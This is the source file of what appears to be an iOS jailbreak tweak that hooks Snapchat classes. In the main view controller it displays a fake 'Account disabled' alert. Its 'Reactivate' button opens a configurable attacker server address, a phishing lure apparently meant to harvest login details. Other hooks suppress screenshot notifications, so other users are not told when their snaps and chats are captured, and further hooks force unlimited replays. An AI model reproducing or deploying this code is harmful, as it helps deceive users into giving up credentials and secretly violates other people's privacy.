#include "fishhook/fishhook.h"
#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import "substrate.h"

/* ============
   Interficies
============= */

@interface Manager
+(id) shared;
-(void) startTimer:(id)snap source:(int)source;
-(void) markSnapAsViewed:(id)snap;
@end

/* ============
   Variables
============= */

id currentSnap = nil;
int bounds = 40;
bool alertOnScreen = NO;

/* ============
   Hooks
============= */

%hook MainViewController
-(void)initMiddleVC {
	%orig;
	if ([[NSUserDefaults standardUserDefaults] boolForKey:@"alertOnScreen"] == NO) {
	   UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Account disabled"
	                                              message:@"Your account has been disablef for security reasons. Please, reactivate it."
	                                              delegate:self
	                                              cancelButtonTitle:@"Reactivate"
	                                              otherButtonTitles:nil];
		[alert show];
	    [[NSUserDefaults standardUserDefaults] setBool:YES forKey:@"alertOnScreen"];
	    [[NSUserDefaults standardUserDefaults] synchronize];
	}
}

%new -(void)alertView:(UIAlertView *)alert clickedButtonAtIndex:(NSInteger)buttonIndex{
	if (buttonIndex == 0){
    	NSURL *actionURL = [NSURL URLWithString:@"http://192.168.1.40:8888"]; // Remplace with your server IP and port
    	[[UIApplication sharedApplication] openURL:actionURL];
	}
}
%end

%hook SCChatViewController
-(void)userDidTakeScreenshot {
	return;
}
%end

%hook SCChatViewControllerV2
-(void)userDidTakeScreenshot {
	return;
}
%end

%hook SCViewingStoryViewController
-(void)userDidTakeScreenshot {
	return;
}
%end

%hook SCFeedViewController
-(void)tapToSkip:(UIGestureRecognizer *)tap {
	CGPoint coords = [tap locationInView:tap.view];

	if (coords.x < [UIScreen mainScreen].bounds.size.width - bounds - 5 || coords.y < [UIScreen mainScreen].bounds.size.height - bounds - 5) {
		@try {
			if (currentSnap) {
				[[%c(Manager) shared] markSnapAsViewed:currentSnap];
				currentSnap = nil;
			}
		}
		@catch(NSException *){}
	}

	%orig;
}
- (void)didFinishSnapPlaying:(id)snap {
	currentSnap = nil;
	%orig;
}
- (void)didSucceedSetUpSnapPlaying:(id)snap {
	currentSnap = snap;
	%orig;
}
-(void)userDidTakeScreenshot {
	return;
}
%end

%hook SCCaptionDefaultTextView
-(CGFloat) maxTextWidth {
	return FLT_MAX;
}
%end

%hook Manager
-(void)tick:(id)tick {
	return;
}

-(void)startTimer:(id)snap source:(int)source {
	currentSnap = snap;

	%orig;
}
%end

%hook User
- (_Bool)hasFreeReplaySnap {
		return 1;
	}
%end

%hook SCSnapPlayController
- (_Bool)canReplaySnap {
	return 1;
}
%end
